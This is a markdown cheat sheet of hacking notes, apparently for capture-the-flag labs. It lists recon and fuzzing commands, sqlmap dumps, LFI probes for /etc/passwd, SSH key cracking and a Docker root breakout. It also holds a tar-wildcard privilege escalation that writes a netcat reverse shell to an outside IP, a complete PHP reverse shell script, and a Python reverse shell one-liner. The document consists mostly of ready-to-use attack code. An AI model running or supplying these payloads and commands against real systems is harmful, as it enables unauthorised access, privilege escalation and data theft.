# hacking_notes

## Recon

### Scanning ports
```powershell
sudo nmap -A -o scan_agsv.txt 10.10.10.218
sudo nmap -sS -p- -o scan_full.txt 10.10.10.218
```
### Fuzzing subdomains
```powershell
wfuzz -w subdomains-top1million-5000.txt -H "Host: FUZZ.vulnnet.thm" --hc 200 10.10.236.248
```

### sqlmap
```powershell
sqlmap -r ./test_user --dbms=MySQL --technique=U --delay=3
sqlmap -r ./test_user --dbms=MySQL --current-db
sqlmap -r ./test_user --dbms=MySQL -D marketplace --dump
```


### LFI
```powershell
python ./panoptic.py --url http://vulnnet.thm/\?referer\=test
```

### Fuzzing for command executions via LFI 
```powershell
wfuzz -w SecLists-master/Discovery/Web-Content/burp-parameter-names.txt http://vulnnet.thm/\?\FUZZ\=id\;whoami\|\|ls
wfuzz --hh 5829 -w ~/Documents/SecLists-master/Discovery/Web-Content/burp-parameter-names.txt http://vulnnet.thm/\?\FUZZ\=/etc/passwd
```

### Fuzzing dir
```powershell
gobuster -u http://broadcast.vulnnet.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster -u http://10.10.236.248 -w SecLists-master/Discovery/Web-Content/common.txt
```

### Wordpress
```powershell
wpscan --url http://10.10.255.124/blog --enumerate u
wpscan --url http://10.10.74.136/ --passwords /usr/share/wordlists/rockyou.txt --usernames user1,user2
```


## Cracking

### Crack ssh passphrase
```powershell
python ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

## Priv Esc

### tar wildcards
```powershell
cd target_dir
echo "mkfifo /tmp/bggenux; nc 10.9.4.192 4444 0</tmp/bggenux | /bin/sh >/tmp/bggenux 2>&1; rm /tmp/bggenux" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
```
* [https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
* [https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/)


### Docker
```powershell
docker run -it -v /:/host/ <docker image> chroot /host/ bash
```
* [https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)


## Payloads

### PHP Reverse Shell

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

### Python Reverse Shell

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Misc

### Start local server
```powershell
python -m SimpleHTTPServer
```

### Get tty in shell
```powershell
python3 -c'import pty;pty.spawn("/bin/bash")'
```

## TODO

[*] ftp
[*] hydra
[*] http bruteforce
[*] one line reverse shell
[*] check linux exploit
[*] smb (nmap script enum)
[*] john
